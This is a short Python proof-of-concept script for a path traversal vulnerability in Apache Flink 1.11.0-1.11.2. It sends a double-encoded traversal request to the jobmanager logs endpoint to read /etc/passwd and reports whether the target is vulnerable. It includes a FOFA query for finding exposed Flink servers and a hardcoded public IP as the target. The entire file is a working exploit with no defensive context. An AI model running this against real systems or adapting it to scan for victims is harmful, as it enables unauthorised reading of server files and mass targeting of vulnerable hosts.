#-*- coding:utf-8 -*-
#affected versions are Apache Flink 1.11.0-1.11.2
import requests
import sys

def title():
	print('fofa:app="Apache-Flink"')

def run(ip, port):
	proto = ['http', 'https']
	i = 0
	while i < len(proto):
		target = '{}://{}:{}'.format(proto[i], ip, port)
		proto_result = run_proto(target)
		if proto_result:
			return True
		else:
			i = i + 1

def run_proto(target):
	#url ="http://192.168.124.132:8081"
	headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"}
	poc = "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
	url = target + poc
	print("target=  %s" % target)
	try:
		requests.packages.urllib3.disable_warnings()
		req = requests.get(url=url, headers=headers, verify=False, timeout=3)
		if "/bin/bash" in req.text and req.status_code == 200:
			return True
		else:
			pass
	except Exception as e:
		pass

if __name__ == '__main__':
	title()
	target = '139.129.44.2:8081'
	ip = target.split(':')[0]
	port = str(int(target.split(':')[1]))
	result = run(ip, port)
	if result:
		print('Exist')
	else:
		print('UnExist')
